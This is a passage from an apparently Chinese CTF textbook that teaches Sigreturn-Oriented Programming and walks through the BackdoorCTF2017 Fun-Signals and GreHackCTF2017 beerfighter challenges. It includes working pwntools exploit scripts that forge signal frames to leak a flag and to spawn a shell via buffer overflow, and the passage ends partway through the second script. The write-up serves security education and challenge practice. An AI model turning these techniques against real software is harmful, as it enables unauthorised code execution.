RIP ： syscall; ret; gadget 的地址
RAX ： read 的系统调用号
RDI ：文件描述符，即从哪儿读入
RSI ：可写内存的地址，即写入到哪儿
RDX ：读入的字节数，这里是 306
sigreturn gadget 执行完之后，因为设置了 RIP ，会再次执行
syscall; ret; gadget。payload 的第二部分就是通过这里读入到文件描述
符的。这一部分包含了 3 个 syscall; ret; ，fake frame 和其他的代码或数
据。
接收完数据或， read 函数返回，返回值即读入的字节数被放到 RAX 中。
我们的可写内存被这些数据所覆盖，并且 RSP 指向了它的开头。然后
syscall; ret; 被执行，由于 RAX 的值为 306，即 syncfs 的系统调用
号，该调用总是返回 0，而 0 又是 read 的调用号。
再次执行 syscall; ret; ，即 read 系统调用。这一次，读入的内容不重
要，重要的是数量，让它等于 15，即 sigreturn 的调用号。
执行第三个 syscall; ret; ，即 sigreturn 系统调用。从第二个 fake
frame 中恢复寄存器，这里是 execve("/bin/sh", ...) 。另外你还可以调
951
6.1.4 pwn BackdoorCTF2017 Fun-Signals
用 mprotect 将某段数据变为可执行的。
执行 execve ，拿到 shell。
pwnlib.rop.srop
在 pwntools 中已经集成了 SROP 的利用工具，即 pwnlib.rop.srop，直接使用类
SigreturnFrame ，我们来看一下它的构造：
>>> from pwn import *
>>> context.arch
'i386'
>>> SigreturnFrame(kernel='i386')
{'es': 0, 'esp_at_signal': 0, 'fs': 0, 'gs': 0, 'edi': 0, 'eax':
0, 'ebp': 0, 'cs': 115, 'edx': 0, 'ebx': 0, 'ds': 0, 'trapno': 0
, 'ecx': 0, 'eip': 0, 'err': 0, 'esp': 0, 'ss': 123, 'eflags': 0
, 'fpstate': 0, 'esi': 0}
>>> SigreturnFrame(kernel='amd64')
{'es': 0, 'esp_at_signal': 0, 'fs': 0, 'gs': 0, 'edi': 0, 'eax':
0, 'ebp': 0, 'cs': 35, 'edx': 0, 'ebx': 0, 'ds': 0, 'trapno': 0,
'ecx': 0, 'eip': 0, 'err': 0, 'esp': 0, 'ss': 43, 'eflags': 0, '
fpstate': 0, 'esi': 0}
>>>
>>> context.arch = 'amd64'
>>> SigreturnFrame(kernel='amd64')
{'r14': 0, 'r15': 0, 'r12': 0, 'rsi': 0, 'r10': 0, 'r11': 0, '&f
pstate': 0, 'rip': 0, 'csgsfs': 51, 'uc_stack.ss_flags': 0, 'old
mask': 0, 'sigmask': 0, 'rsp': 0, 'rax': 0, 'r13': 0, 'cr2': 0,
'r9': 0, 'rcx': 0, 'trapno': 0, 'err': 0, 'rbx': 0, 'uc_stack.ss
_sp': 0, 'r8': 0, 'rdx': 0, 'rbp': 0, 'uc_flags': 0, '__reserved'
: 0, '&uc': 0, 'eflags': 0, 'rdi': 0, 'uc_stack.ss_size': 0}
总共有三种，结构和初始化的值会 有所不同：
i386 on i386：32 位系统上运行 32 位程序
i386 on amd64：64 位系统上运行 32 位程序
amd64 on amd64：64 为系统上运行 64 位程序
952
6.1.4 pwn BackdoorCTF2017 Fun-Signals
BackdoorCTF2017 Fun Signals
$ file funsignals_player_bin
funsignals_player_bin: ELF 64-bit LSB executable, x86-64, versio
n 1 (SYSV), statically linked, not stripped
这是一个 64 位静态链接的 srop，可以说是什么都没开。。。
$ checksec -f funsignals_player_bin
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
No RELRO No canary found NX disabled No PIE
No RPATH No RUNPATH No 0 0 funsign
als_player_bin
953
6.1.4 pwn BackdoorCTF2017 Fun-Signals
gdb-peda$ disassemble _start
Dump of assembler code for function _start:
0x0000000010000000 : xor eax,eax
0x0000000010000002 : xor edi,edi
0x0000000010000004 : xor edx,edx
0x0000000010000006 : mov dh,0x4
0x0000000010000008 : mov rsi,rsp
0x000000001000000b : syscall
0x000000001000000d : xor edi,edi
0x000000001000000f : push 0xf
0x0000000010000011 : pop rax
0x0000000010000012 : syscall
0x0000000010000014 : int3
End of assembler dump.
gdb-peda$ disassemble syscall
Dump of assembler code for function syscall:
0x0000000010000015 : syscall
0x0000000010000017 : xor rdi,rdi
0x000000001000001a : mov rax,0x3c
0x0000000010000021 : syscall
End of assembler dump.
gdb-peda$ x/s flag
0x10000023 : "fake_flag_here_as_original_is_at_server
"
而且 flag 就在二进制文件里，只不过是在服务器上的那个里面，过程是完全一样
的。
首先可以看到 _start 函数里有两个 syscall。第一个是 read(0, $rip,
0x400) （调用号 0x0 ），它从标准输入读取 0x400 个字节到 rip 指向的地
址处，也就是栈上。第二个是 sigreturn() （调用号 0xf ），它将从栈上读取
sigreturn frame。所以我们就可以伪造一个 frame。
那么怎样读取 flag 呢，需要一个 write(1, &flag, 50) ，调用号为 0x1 ，而
函数 syscall 正好为我们提供了 syscall 指令，构造 payload 如下：
954
6.1.4 pwn BackdoorCTF2017 Fun-Signals
from pwn import *
elf = ELF('./funsignals_player_bin')
io = process('./funsignals_player_bin')
# io = remote('hack.bckdr.in', 9034)
context.clear()
context.arch = "amd64"
# Creating a custom frame
frame = SigreturnFrame()
frame.rax = constants.SYS_write
frame.rdi = constants.STDOUT_FILENO
frame.rsi = elf.symbols['flag']
frame.rdx = 50
frame.rip = elf.symbols['syscall']
io.send(str(frame))
io.interactive()
$ python2 exp_funsignals.py
[*] '/home/firmy/Desktop/funsignals_player_bin'
Arch: amd64-64-little
RELRO: No RELRO
Stack: No canary found
NX: NX disabled
PIE: No PIE (0x10000000)
RWX: Has RWX segments
[+] Opening connection to 127.0.0.1 on port 10001: Done
[*] Switching to interactive mode
fake_flag_here_as_original_is_at_server\x00\x00\x00\x00\x00\x00\
x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
如果连接的是远程服务器， fake_flag_here_as_original_is_at_server 会被
替换成真正的 flag。
这一节我们详细介绍了 SROP 的原理，并展示了一个简单的例子，在后面的章节
中，会展示其更复杂的运用，包扩结合 vDSO 的用法。
955
6.1.4 pwn BackdoorCTF2017 Fun-Signals
参考资料
Framing Signals—A Return to Portable Shellcode
slides: Framing Signals a return to portable shellcode
Sigreturn Oriented Programming
Sigreturn Oriented Programming is a real Threat
Sigreturn Oriented Programming (SROP) Attack攻击原理
956
6.1.5 pwn GreHackCTF2017 beerfighter
6.1.5 pwn GreHackCTF2017 beerfighter
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file game
game: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), stati
cally linked, BuildID[sha1]=1f9b11cb913afcbbbf9cb615709b3c62b2fd
b5a2, stripped
$ checksec -f game
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO No canary found NX enabled No PIE
No RPATH No RUNPATH No 0 0 game
64 位，静态链接，stripped。
既然是个小游戏，先玩一下，然后发现，进入 City Hall 后，有一个可以输入字符串
的地方，然而即使我们什么也不输入，直接回车，在 Leave the town 时也会出现
Segmentation fault：
957
6.1.5 pwn GreHackCTF2017 beerfighter
[0] The bar
[1] The City Hall
[2] The dark yard
[3] Leave the town for ever
Type your action number > 1
Welcome Newcomer! I am the mayor of this small town and my role
is to register the names of its citizens.
How should I call you?
[0] Tell him your name
[1] Leave
Type your action number > 0
Type your character name here >
...
[0] The bar
[1] The City Hall
[2] The dark yard
[3] Leave the town for ever
Type your action number > 3
By !
Segmentation fault (core dumped)
题目解析
程序大概清楚了，看代码吧，经过一番搜索，发现了一个很有意思的函数：
958
6.1.5 pwn GreHackCTF2017 beerfighter
[0x00400d8e]> pdf @ fcn.00400773
/ (fcn) fcn.00400773 15
| fcn.00400773 ();
| ; CALL XREF from 0x00400221 (fcn.004001f3)
| ; CALL XREF from 0x004002b6 (fcn.00400288)
| 0x00400773 4889f8 mov rax, rdi
| 0x00400776 4889f7 mov rdi, rsi
| 0x00400779 4889d6 mov rsi, rdx
| 0x0040077c 4889ca mov rdx, rcx
| 0x0040077f 0f05 syscall
\ 0x00400781 c3 ret
syscall;ret ，你想到了什么，对，就是前面讲的 SROP。
其实前面的输入一个字符串，程序也是通过 syscall 来读入的，从函数
0x004004b8 开始仔细跟踪代码后就会知道，系统调用为 read() 。
gdb-peda$ pattern_offset $ebp
1849771374 found at offset: 1040
缓冲区还挺大的， 1040+8=1048 。
漏洞利用
好，现在思路已经清晰了，先利用缓冲区溢出漏洞，用 syscall;ret 地址覆盖
返回地址，通过 frame_1 调用 read() 读入 frame_2 到 .data 段（这个程序
没有 .bss ，而且 .data 可写），然后将栈转移过去，调用 execve() 执
行“/bin/sh”，从而拿到 shell。
构造 sigreturn：
$ ropgadget --binary game --only "pop|ret"
...
0x00000000004007b2 : pop rax ; ret
959
6.1.5 pwn GreHackCTF2017 beerfighter
# sigreturn syscall
sigreturn = p64(pop_rax_addr)
sigreturn += p64(constants.SYS_rt_sigreturn) # 0xf
sigreturn += p64(syscall_addr)
然后是 frame_1，通过设定 frame_1.rsp = base_addr 来转移栈：
# frame_1: read frame_2 to .data
frame_1 = SigreturnFrame()
frame_1.rax = constants.SYS_read
frame_1.rdi = constants.STDIN_FILENO
frame_1.rsi = data_addr
frame_1.rdx = len(str(frame_2))
frame_1.rsp = base_addr # stack pivot
frame_1.rip = syscall_addr
frame_2 执行 execve() ：
# frame_2: execve to get shell
frame_2 = SigreturnFrame()
frame_2.rax = constants.SYS_execve
frame_2.rdi = data_addr
frame_2.rsi = 0
frame_2.rdx = 0
frame_2.rip = syscall_addr
Bingo!!!
960
6.1.5 pwn GreHackCTF2017 beerfighter
$ python2 exp.py
[*] '/home/firmy/Desktop/game'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
[+] Starting local process './game': pid 12975
[*] Switching to interactive mode
By !
$ whoami
firmy
exploit
完整的 exp 如下：
from pwn import *
elf = ELF('./game')
io = process('./game')
io.recvuntil("> ")
io.sendline("1")
io.recvuntil("> ")
io.sendline("0")
io.recvuntil("> ")
context.clear()
context.arch = "amd64"
data_addr = elf.get_section_by_name('.data').header.sh_addr + 0x
10
base_addr = data_addr + 0x8 # new stack address
# useful gadget
pop_rax_addr = 0x00000000004007b2 # pop rax ; ret
syscall_addr = 0x000000000040077f # syscall ;
961
6.1.5 pwn GreHackCTF2017 beerfighter
# sigreturn syscall
sigreturn = p64(pop_rax_addr)
sigreturn += p64(constants.SYS_rt_sigreturn) # 0xf
sigreturn += p64(syscall_addr)
# frame_2: execve to get shell
frame_2 = SigreturnFrame()
frame_2.rax = constants.SYS_execve
frame_2.rdi = data_addr
frame_2.rsi = 0
frame_2.rdx = 0
frame_2.rip = syscall_addr
# frame_1: read frame_2 to .data
frame_1 = SigreturnFrame()
frame_1.rax = constants.SYS_read
frame_1.rdi = constants.STDIN_FILENO
frame_1.rsi = data_addr
frame_1.rdx = len(str(frame_2))
frame_1.rsp = base_addr # stack pivot
frame_1.rip = syscall_addr
payload_1 = "A" * 1048